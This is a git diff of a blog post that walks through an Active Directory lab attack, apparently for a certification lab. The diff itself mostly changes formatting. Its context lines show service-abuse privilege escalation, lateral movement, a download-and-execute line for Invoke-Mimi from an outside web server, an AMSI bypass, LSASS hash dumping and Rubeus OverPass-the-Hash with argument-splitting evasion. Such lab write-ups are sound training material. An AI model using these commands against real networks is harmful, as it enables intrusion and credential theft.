@@ -36,11 +36,14 @@ description: Designed to provide a comprehensive guide to Active Directory (AD) 
 
 First step for local privilege escalation, we will try to check for any privilege escalation path. Then if we found any services that can be abused, we can add our domain user to the local admin group.
 
-{: .prompt-info }
 ```bash
 #Check for any priviliege escalation path
 Invoke-AllChecks
+```
 
+![Result](/img/cwae/result1.png){: w="400" h="400" }{: .normal }
+
+```bash
 #Abuse the service and add our current domain user to the local Administrator group
 Invoke-ServiceAbuse
 Invoke-ServiceAbuse -Name 'AbyssWebServer' -UserName 'dcorp\studentx' -Verbose
@@ -52,14 +55,14 @@ Now, our user is a local admin !
 
 Next step, we will try to identify any computers/machines in the domain where our user has local administrative access. 
 
-{: .prompt-info }
+
 ```bash
 #Identify a computer within the network domain where the current user has local admin privileges.
 Find-PSRemotingLocalAdminAccess
 ```
 
 We can connect to the machine who has the local administrative access by using winrs
-{: .prompt-info }
+
 ```bash
 winrs -r:dcorp-adminsrv cmd
 
@@ -69,7 +72,7 @@ set computername
 ```
 
 We can also use PowerShell Remoting
-{: .prompt-info }
+
 ```bash
 Enter-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local
 ```
@@ -77,7 +80,7 @@ Enter-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local
 ## 4. Identify a machine in the domain where a Domain Admin session is available - PowerView
 
 A request will be sent to Domain Controller to retrieve all ComputerName and membership of the domain admin's group which has admin session there.
-{: .prompt-info }
+
 ```bash
 Find-DomainUserLocation
 ```
@@ -87,13 +90,13 @@ Find-DomainUserLocation
 Once we have remote admin session on the remote machine, we will extract credentials from LSASS. Bear in mind , **to avoid LSASS unless you have nothing to do.**
 
 Check if we can run commands on dcorp-mgmt using PowerShell remoting
-{: .prompt-info }
+
 ```bash
 Invoke-Command -ScriptBlock {$env:username;$env:computername} -ComputerName dcorp-mgmt
 ```
 
 Now, let’s use Invoke-Mimi to dump hashes on dcorp-mgmt to grab hashes of the domain admin. This script is to downloads and executes the Invoke-Mimi.ps1 that is hosted in my web server.
-{: .prompt-info }
+
 ```bash
  iex (iwr http://172.16.100.X/Invoke-Mimi.ps1 -UseBasicParsing)
 ```
@@ -102,7 +105,7 @@ Then, we need to bypass the AMSI using our [script](https://beardenx.github.io/p
 
 we can use the AMSI bypass we have been using or the built-in Set-MpPrefernce as well because we have administrative access on dcorp-mgmt
 
-{: .prompt-info }
+
 ```bash
 $sess = New-PSSession -ComputerName dcorp-mgmt.dollarcorp.moneycorp.local
 
@@ -116,7 +119,7 @@ Invoke-command -ScriptBlock ${function:Invoke-Mimi} -Session $sess
 Finally, use OverPass-the-Hash to use svcadmin's credentials.
 
 Run the below commands from an elevated shell on the student VM to use Rubeus.
-{: .prompt-info }
+
 ```bash
 ArgSplit.bat
 
@@ -130,21 +133,21 @@ set "u=a"
 set "Pwn=%u%%v%%w%%x%%y%%z%"
 ```
 
-{: .prompt-info }
+
 ```bash
 Rubeus.exe -args %Pwn% /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
 ```
 
 Now, we get our TGT Ticket. Try accessing the domain controller from the new process!
 Note that we did not need to have direct access to dcorp-mgmt from student machine 100.X.
-{: .prompt-info }
+
 ```bash
 winrs -r:dcorp-dc cmd /c set username USERNAME=svcadmin
 ```
 
 ## 7. Domain Admin Escalation using Derivative Local Admin - Find-PSRemotingLocalAdminAccess.ps1
 
-{: .prompt-info }
+
 ```bash
  Find-PSRemotingLocalAdminAccess
 ```
